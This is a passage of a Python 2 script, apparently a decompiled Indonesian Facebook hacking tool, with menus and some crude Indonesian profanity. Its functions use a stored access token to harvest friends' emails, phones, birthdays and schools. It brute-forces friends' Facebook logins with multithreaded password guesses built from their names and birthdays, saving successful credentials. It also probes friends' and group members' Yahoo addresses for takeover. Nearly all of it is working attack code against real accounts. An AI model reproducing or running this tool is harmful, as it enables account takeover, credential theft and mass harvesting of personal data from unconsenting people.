    pilih()


def pilih():
    print ' '
    zedd = raw_input('\x1b[1;97m\x1b[1;91m[\x1b[1;92m\xe2\x80\xa2\x1b[1;91m]\x1b[1;96m>>> \x1b[1;97m')
    if zedd == '':
        print '\x1b[1;91m[!] Wrong input'
        pilih()
    elif zedd == '1':
        informasi()
    elif zedd == '2':
        autobf()
    elif zedd == '3':
        guard()
    elif zedd == '4':
        menu_yahoo()
    elif zedd == '99':
        os.system('rm -rf login.txt')
        keluar()
    elif zedd == '00' or '0':
        keluar()
    else:
        print '\x1b[1;91m[!] Wrong input'
        pilih()


def informasi():
    os.system('reset')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;91m[!] Token not found'
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()

    os.system('reset')
    print logo
    print '\n\x1b[1;97m\xe2\x95\x94\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x97\n\x1b[1;97m     [\x1b[1;92m\xe2\x88\x9a\x1b[1;97m]\x1b[1;93m\x1b[1;96mGet Information a User\n\x1b[1;97m\xe2\x95\x9a\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x9d\n'
    aid = raw_input('\x1b[1;97m[{}]\x1b[1;95m Input ID \x1b[1;97m:\x1b[1;91m ')
    r = requests.get('https://graph.facebook.com/me/friends?access_token=' + toket)
    cok = json.loads(r.text)
    for i in cok['data']:
        if aid in i['name'] or aid in i['id']:
            x = requests.get('https://graph.facebook.com/' + i['id'] + '?access_token=' + toket)
            z = json.loads(x.text)
            print '\x1b[1;96m\xe2\x95\x94' + 40 * '\x1b[1;96m\xe2\x95\x90' + '\xe2\x95\x97'
            try:
                print ' \x1b[1;97mName\x1b[1;97m          : ' + z['name']
            except KeyError:
                print ' \x1b[1;97mName\x1b[1;97m          : \x1b[1;97mNot found'
            else:
                try:
                    print ' \x1b[1;97mID\x1b[1;97m            : ' + z['id']
                except KeyError:
                    print ' \x1b[1;97mID\x1b[1;97m            : \x1b[1;97mNot found'
                else:
                    try:
                        print ' \x1b[1;97mEmail\x1b[1;97m         : ' + z['email']
                    except KeyError:
                        print ' \x1b[1;97mEmail\x1b[1;97m         : \x1b[1;97mNot found'
                    else:
                        try:
                            print ' \x1b[1;97mTelephone\x1b[1;97m     : ' + z['mobile_phone']
                        except KeyError:
                            print ' \x1b[1;97mTelephone\x1b[1;97m     : \x1b[1;97mNot found'

                        try:
                            print ' \x1b[1;97mLocation\x1b[1;97m      : ' + z['location']['name']
                        except KeyError:
                            print ' \x1b[1;97mLocation\x1b[1;97m      : \x1b[1;97mNot found'

                    try:
                        print ' \x1b[1;97mDate of birth\x1b[1;97m : ' + z['birthday']
                    except KeyError:
                        print ' \x1b[1;97mDate of birth\x1b[1;97m : \x1b[1;97mNot found'

                try:
                    print ' \x1b[1;97mSchool\x1b[1;97m        : '
                    for q in z['education']:
                        try:
                            print ' \x1b[1;97m                   + \x1b[1;97m' + q['school']['name']
                        except KeyError:
                            print '\x1b[1;97m                   + \x1b[1;97mNot found'

                except KeyError:
                    pass

            raw_input('\n\x1b[1;95m[ \x1b[1;97mGo to Back \x1b[1;95m]')
            menu()
    else:
        print '\x1b[1;97mUser not found'
        raw_input('\n\x1b[1;91m[ \x1b[1;97mGo to Back \x1b[1;91m]')
        menu()


def autobf():
    global toket
    os.system('reset')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;91m[!] Token not found'
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()

    os.system('reset')
    print logo
    print '\x1b[1;94m1.\x1b[1;91m Continue'
    print '\x1b[1;94m0.\x1b[1;97m Back'
    pilih_autobf()


def pilih_autobf():
    global cekpoint
    global oks
    peakbf = raw_input('\x1b[1;97m\x1b[1;91m[\x1b[1;92m\xe2\x80\xa2\x1b[1;91m]\x1b[1;96m>>> \x1b[1;97m')
    if peakbf == '':
        print '\x1b[1;91m[!] Wrong input'
        pilih_super()
    elif peakbf == '1':
        os.system('reset')
        print logo
        r = requests.get('https://graph.facebook.com/me/friends?access_token=' + toket)
        z = json.loads(r.text)
        for s in z['data']:
            id.append(s['id'])

    elif peakbf == '0':
        menu()
    else:
        print '\x1b[1;91m[!] Wrong input'
        pilih_autobf()
    print '\x1b[1;91m[+] \x1b[1;92mTotal ID \x1b[1;91m: \x1b[1;97m' + str(len(id))
    print '\x1b[1;91m[\xe2\x9c\xba] \x1b[1;92mStart \x1b[1;97m...'
    print
    print 42 * '\x1b[1;97m\xe2\x95\x90'
    os.system('reset')
    print '\x1b[1;97m\xe2\x95\x94\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x97'
    print '\x1b[1;97m     [\x1b[1;92m\xe2\x88\x9a\x1b[1;97m]\x1b[1;93m\x1b[1;96mAuto Brute Force'
    print '\x1b[1;97m     [\x1b[1;92m\xe2\x88\x9a\x1b[1;97m]\x1b[1;93m\x1b[1;96mTotal ID \x1b[1;97m:\x1b[1;91m ' + str(len(id))
    print '\x1b[1;97m\xe2\x95\x9a\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x9d'
    print 42 * '\x1b[1;91m\xe2\x95\x90'

    def main(arg):
        user = arg
        try:
            os.mkdir('asu')
        except OSError:
            pass
        else:
            try:
                a = requests.get('https://graph.facebook.com/' + user + '/?access_token=' + toket)
                b = json.loads(a.text)
                pass1 = b['first_name'] + '123'
                data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                q = json.load(data)
                if 'access_token' in q:
                    x = requests.get('https://graph.facebook.com/' + user + '?access_token=' + q['access_token'])
                    z = json.loads(x.text)
                    print '\x1b[1;97m[ \x1b[1;92m\xe2\x9c\x93\x1b[1;97m ] ' + user + '|' + pass1 + ' =>' + z['name']
                    oks.append(user + pass1)
                elif 'www.facebook.com' in q['error_msg']:
                    cek = open('asu/super_cp.txt', 'a')
                    cek.write(user + '|' + pass1 + '\n')
                    cek.close()
                    cekpoint.append(user + pass1)
                else:
                    pass2 = b['first_name'] + '12345'
                    data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                    q = json.load(data)
                    if 'access_token' in q:
                        x = requests.get('https://graph.facebook.com/' + user + '?access_token=' + q['access_token'])
                        z = json.loads(x.text)
                        print '\x1b[1;97m[ \x1b[1;92m\xe2\x9c\x93\x1b[1;97m ] ' + user + '|' + pass2 + ' =>' + z['name']
                        oks.append(user + pass2)
                    elif 'www.facebook.com' in q['error_msg']:
                        cek = open('asu/super_cp.txt', 'a')
                        cek.write(user + '|' + pass2 + '\n')
                        cek.close()
                        cekpoint.append(user + pass2)
                    else:
                        pass3 = b['last_name'] + '123'
                        data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass3 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                        q = json.load(data)
                        if 'access_token' in q:
                            x = requests.get('https://graph.facebook.com/' + user + '?access_token=' + q['access_token'])
                            z = json.loads(x.text)
                            print '\x1b[1;97m[ \x1b[1;92m\xe2\x9c\x93\x1b[1;97m ] ' + user + '|' + pass3 + ' =>' + z['name']
                            oks.append(user + pass3)
                        elif 'www.facebook.com' in q['error_msg']:
                            cek = open('asu/super_cp.txt', 'a')
                            cek.write(user + '|' + pass3 + '\n')
                            cek.close()
                            cekpoint.append(user + pass3)
                        else:
                            lahir = b['birthday']
                            pass4 = lahir.replace('/', '')
                            data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass4 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                            q = json.load(data)
                            if 'access_token' in q:
                                x = requests.get('https://graph.facebook.com/' + user + '?access_token=' + q['access_token'])
                                z = json.loads(x.text)
                                print '\x1b[1;97m[ \x1b[1;92m\xe2\x9c\x93\x1b[1;97m ] ' + user + '|' + pass4 + ' =>' + z['name']
                                oks.append(user + pass4)
                            elif 'www.facebook.com' in q['error_msg']:
                                cek = open('asu/super_cp.txt', 'a')
                                cek.write(user + '|' + pass4 + '\n')
                                cek.close()
                                cekpoint.append(user + pass4)
                            else:
                                pass5 = 'sayang123'
                                data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass5 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                q = json.load(data)
                                if 'access_token' in q:
                                    x = requests.get('https://graph.facebook.com/' + user + '?access_token=' + q['access_token'])
                                    z = json.loads(x.text)
                                    print '\x1b[1;97m[ \x1b[1;92m\xe2\x9c\x93\x1b[1;97m ] ' + user + '|' + pass5 + ' =>' + z['name']
                                    oks.append(user + pass5)
                                elif 'www.facebook.com' in q['error_msg']:
                                    cek = open('asu/super_cp.txt', 'a')
                                    cek.write(user + '|' + pass5 + '\n')
                                    cek.close()
                                    cekpoint.append(user + pass5)
                                else:
                                    pass6 = 'kontol123'
                                    data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass6 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                    q = json.load(data)
                                    if 'access_token' in q:
                                        x = requests.get('https://graph.facebook.com/' + user + '?access_token=' + q['access_token'])
                                        z = json.loads(x.text)
                                        print '\x1b[1;97m[ \x1b[1;92m\xe2\x9c\x93\x1b[1;97m ] ' + user + '|' + pass6 + ' =>' + z['name']
                                        oks.append(user + pass6)
                                    elif 'www.facebook.com' in q['error_msg']:
                                        cek = open('asu/super_cp.txt', 'a')
                                        cek.write(user + '|' + pass6 + '\n')
                                        cek.close()
                                        cekpoint.append(user + pass6)
                                    else:
                                        a = requests.get('https://graph.facebook.com/' + user + '/?access_token=' + toket)
                                        b = json.loads(a.text)
                                        pass7 = b['first_name'] + '321'
                                        data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass7 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                        q = json.load(data)
                                        if 'access_token' in q:
                                            x = requests.get('https://graph.facebook.com/' + user + '?access_token=' + q['access_token'])
                                            z = json.loads(x.text)
                                            print '\x1b[1;97m[ \x1b[1;92m\xe2\x9c\x93\x1b[1;97m ] ' + user + '|' + pass7 + ' =>' + z['name']
                                            oks.append(user + pass7)
                                        elif 'www.facebook.com' in q['error_msg']:
                                            cek = open('asu/super_cp.txt', 'a')
                                            cek.write(user + '|' + pass7 + '\n')
                                            cek.close()
                                            cekpoint.append(user + pass7)
                                        else:
                                            pass8 = 'indonesia123'
                                            data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass8 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                            q = json.load(data)
                                            if 'access_token' in q:
                                                x = requests.get('https://graph.facebook.com/' + user + '?access_token=' + q['access_token'])
                                                z = json.loads(x.text)
                                                print '\x1b[1;97m[ \x1b[1;92m\xe2\x9c\x93\x1b[1;97m ] ' + user + '|' + pass6 + ' =>' + z['name']
                                                oks.append(user + pass8)
                                            elif 'www.facebook.com' in q['error_msg']:
                                                cek = open('asu/super_cp.txt', 'a')
                                                cek.write(user + '|' + pass8 + '\n')
                                                cek.close()
                                                cekpoint.append(user + pass8)
            except:
                pass

    p = ThreadPool(30)
    p.map(main, id)
    print 42 * '\x1b[1;91m\xe2\x95\x90'
    print '\x1b[1;91m[\x1b[1;93m\xe2\x9c\x93\x1b[1;91m] \x1b[1;95mDone \x1b[1;95m....'
    print '\x1b[1;91m[\x1b[1;92m+\x1b[1;91m] \x1b[1;92mTotal OK/CP \x1b[1;97m: \x1b[1;92m' + str(len(oks)) + '\x1b[1;97m/\x1b[1;93m' + str(len(cekpoint))
    print '\x1b[1;91m[+] \x1b[1;92mCP Di simpan di\x1b[1;91m: \x1b[1;96masu/super_cp.txt'
    print 42 * '\x1b[1;91m\xe2\x95\x90'
    raw_input('\n\x1b[1;91m[ \x1b[1;97mGo to Back \x1b[1;91m]')
    menu()


def guard():
    global toket
    os.system('reset')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;91m[!] Token not found'
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()

    os.system('reset')
    print logo
    print '\n\x1b[1;97m\xe2\x95\x94\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x97\n\x1b[1;97m     [\x1b[1;92m\xe2\x88\x9a\x1b[1;97m]\x1b[1;93m\x1b[1;96mProfile Guard\n\x1b[1;97m\xe2\x95\x9a\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x9d\n'
    print '\x1b[1;94m1.\x1b[1;97m Activate'
    print '\x1b[1;94m2.\x1b[1;97m Not activate'
    print '\x1b[1;94m0.\x1b[1;97m Back'
    g = raw_input('\x1b[1;97m\x1b[1;91m[\x1b[1;92m\xe2\x80\xa2\x1b[1;91m]\x1b[1;96m>>> \x1b[1;97m')
    if g == '1':
        aktif = 'true'
        gaz(toket, aktif)
    elif g == '2':
        non = 'false'
        gaz(toket, non)
    elif g == '0':
        menu()
    elif g == '':
        keluar()
    else:
        keluar()


def get_userid(toket):
    url = 'https://graph.facebook.com/me?access_token=%s' % toket
    res = requests.get(url)
    uid = json.loads(res.text)
    return uid['id']


def gaz(toket, enable=True):
    id = get_userid(toket)
    data = 'variables={"0":{"is_shielded": %s,"session_id":"9b78191c-84fd-4ab6-b0aa-19b39f04a6bc","actor_id":"%s","client_mutation_id":"b0316dd6-3fd6-4beb-aed4-bb29c5dc64b0"}}&method=post&doc_id=1477043292367183&query_name=IsShieldedSetMutation&strip_defaults=true&strip_nulls=true&locale=en_US&client_country_code=US&fb_api_req_friendly_name=IsShieldedSetMutation&fb_api_caller_class=IsShieldedSetMutation' % (enable, str(id))
    headers = {'Content-Type': 'application/x-www-form-urlencoded', 'Authorization': 'OAuth %s' % toket}
    url = 'https://graph.facebook.com/graphql'
    res = requests.post(url, data=data, headers=headers)
    print res.text
    if '"is_shielded":true' in res.text:
        os.system('reset')
        print logo
        print '\x1b[1;91m[\x1b[1;92m\xe2\x9c\x93\x1b[1;91m] \x1b[1;91mActivate'
        raw_input('\n\x1b[1;91m[ \x1b[1;97mGo to Back \x1b[1;91m]')
        menu()
    elif '"is_shielded":false' in res.text:
        os.system('reset')
        print logo
        print '\x1b[1;91m[\x1b[1;92m\xe2\x9c\x93\x1b[1;91m] \x1b[1;91mNot activate'
        raw_input('\n\x1b[1;91m[ \x1b[1;97mGo to Back \x1b[1;91m]')
        menu()
    else:
        print '\x1b[1;91m[!] Error'
        keluar()


def menu_yahoo():
    global toket
    os.system('reset')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;91m[!] Token not found'
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()

    os.system('reset')
    print logo
    print '\n\x1b[1;97m\xe2\x95\x94\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x97\n\x1b[1;97m     [\x1b[1;92m\xe2\x88\x9a\x1b[1;97m]\x1b[1;93m\x1b[1;96mYahoo Cloning\n\x1b[1;97m\xe2\x95\x9a\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x9d\n'
    print '\x1b[1;94m1.\x1b[1;91m With list friend'
    print '\x1b[1;94m0.\x1b[1;97m Back'
    yahoo_pilih()


def yahoo_pilih():
    go = raw_input('\x1b[1;97m\x1b[1;91m[\x1b[1;92m\xe2\x80\xa2\x1b[1;91m]\x1b[1;96m>>> \x1b[1;97m')
    if go == '':
        print '\x1b[1;91m[!] Wrong'
        yahoo_pilih()
    elif go == '1':
        yahoofriends()
    elif go == '0':
        menu()
    else:
        print '\x1b[1;91m[!] Wrong'
        yahoo_pilih()


def yahoofriends():
    global toket
    os.system('reset')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;91m[!] Token not found'
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()
    else:
        try:
            os.mkdir('out')
        except OSError:
            pass

    os.system('reset')
    print logo
    mpsh = []
    jml = 0
    teman = requests.get('https://graph.facebook.com/me/friends?access_token=' + toket)
    kimak = json.loads(teman.text)
    save = open('asu/MailVuln.txt', 'w')
    print 42 * '\x1b[1;91m\xe2\x95\x90'
    for w in kimak['data']:
        jml += 1
        mpsh.append(jml)
        id = w['id']
        nama = w['name']
        links = requests.get('https://graph.facebook.com/' + id + '?access_token=' + toket)
        z = json.loads(links.text)
        try:
            mail = z['email']
            yahoo = re.compile('@.*')
            otw = yahoo.search(mail).group()
            if 'yahoo.com' in otw:
                br.open('https://login.yahoo.com/config/login?.src=fpctx&.intl=id&.lang=id-ID&.done=https://id.yahoo.com')
                br._factory.is_html = True
                br.select_form(nr=0)
                br['username'] = mail
                klik = br.submit().read()
                jok = re.compile('"messages.ERROR_INVALID_USERNAME">.*')
                try:
                    pek = jok.search(klik).group()
                except:
                    continue

                if '"messages.ERROR_INVALID_USERNAME">' in pek:
                    save.write(mail + '\n')
                    print '\x1b[1;97m[ \x1b[1;94mVULN\xe2\x9c\x93\x1b[1;97m ] \x1b[1;92m' + mail + ' \x1b[1;97m=>' + nama
                    berhasil.append(mail)
        except KeyError:
            pass

    print 42 * '\x1b[1;97m\xe2\x95\x90'
    print '\x1b[1;91m[\x1b[1;93m\xe2\x9c\x93\x1b[1;91m] \x1b[1;97mDone \x1b[1;97m....'
    print '\x1b[1;91m[+] \x1b[1;97mTotal \x1b[1;91m: \x1b[1;97m' + str(len(berhasil))
    print '\x1b[1;91m[+] \x1b[1;97mFile saved \x1b[1;91m:\x1b[1;97m out/MailVuln.txt'
    save.close()
    print '\x1b[1;97m\xe2\x95\x94\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x97'
    print '\x1b[1;97m    [\x1b[1;92m\xe2\x88\x9a\x1b[1;97m]\x1b[1;93m\x1b[1;92mDone'
    print '\x1b[1;97m    [\x1b[1;92m\xe2\x88\x9a\x1b[1;97m]\x1b[1;93m\x1b[1;96mTotal\x1b[1;97m:\x1b[1;91m' + str(len(berhasil))
    print '\x1b[1;97m    [\x1b[1;92m\xe2\x88\x9a\x1b[1;97m]\x1b[1;93m\x1b[1;92mFile saved\x1b[1;97m:\x1b[1;94m asu/MailVuln.txt'
    print '\x1b[1;97m\xe2\x95\x9a\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x9d'
    raw_input('\n\x1b[1;91m[ \x1b[1;97mGo to Back \x1b[1;91m]')
    menu()


def yahoomember():
    global toket
    os.system('reset')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;91m[!] Token not found'
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()
    else:
        try:
            os.mkdir('out')
        except OSError:
            pass

        os.system('reset')
        print logo
        mpsh = []
        jml = 0
        id = raw_input('\x1b[1;91m[+] \x1b[1;92mInput ID group \x1b[1;91m:\x1b[1;97m ')
        try:
            r = requests.get('https://graph.facebook.com/group/?id=' + id + '&access_token=' + toket)
            asw = json.loads(r.text)
            print '\x1b[1;91m[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m] \x1b[1;92mFrom group \x1b[1;91m:\x1b[1;97m ' + asw['name']
        except KeyError:
            print '\x1b[1;91m[!] Group not found'
            raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
            menu_yahoo()

    jalan('\x1b[1;91m[\xe2\x9c\xba] \x1b[1;92mGetting email from group \x1b[1;97m...')
    teman = requests.get('https://graph.facebook.com/' + id + '/members?fields=name,id&limit=999999999&access_token=' + toket)
    kimak = json.loads(teman.text)
    save = open('out/GrupMailVuln.txt', 'w')
    jalan('\x1b[1;91m[\xe2\x9c\xba] \x1b[1;92mStart \x1b[1;97m...')
    print 42 * '\x1b[1;97m\xe2\x95\x90'
    for w in kimak['data']:
        jml += 1
        mpsh.append(jml)
        id = w['id']
        nama = w['name']
        links = requests.get('https://graph.facebook.com/' + id + '?access_token=' + toket)
        z = json.loads(links.text)
        try:
            mail = z['email']
            yahoo = re.compile('@.*')
            otw = yahoo.search(mail).group()
            if 'yahoo.com' in otw:
                br.open('https://login.yahoo.com/config/login?.src=fpctx&.intl=id&.lang=id-ID&.done=https://id.yahoo.com')
                br._factory.is_html = True
                br.select_form(nr=0)
                br['username'] = mail
                klik = br.submit().read()
                jok = re.compile('"messages.ERROR_INVALID_USERNAME">.*')
                try:
                    pek = jok.search(klik).group()
                except:
                    continue

                if '"messages.ERROR_INVALID_USERNAME">' in pek:
                    save.write(mail + '\n')
                    print '\x1b[1;97m[ \x1b[1;92mVULN\xe2\x9c\x93\x1b[1;97m ] \x1b[1;92m' + mail + ' \x1b[1;97m=>' + nama
                    berhasil.append(mail)
        except KeyError:
            pass

    print 42 * '\x1b[1;97m\xe2\x95\x90'
    print '\x1b[1;91m[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m] \x1b[1;92mDone \x1b[1;97m....'
    print '\x1b[1;91m[+] \x1b[1;92mTotal \x1b[1;91m: \x1b[1;97m' + str(len(berhasil))
    print '\x1b[1;91m[+] \x1b[1;92mFile saved \x1b[1;91m:\x1b[1;97m out/GrupMailVuln.txt'
    save.close()
    raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
    menu_yahoo()


def yahoolist():
    global toket
    os.system('reset')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;91m[!] Token not found'
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()
    else:
        try:
            os.mkdir('out')
        except OSError:
            pass

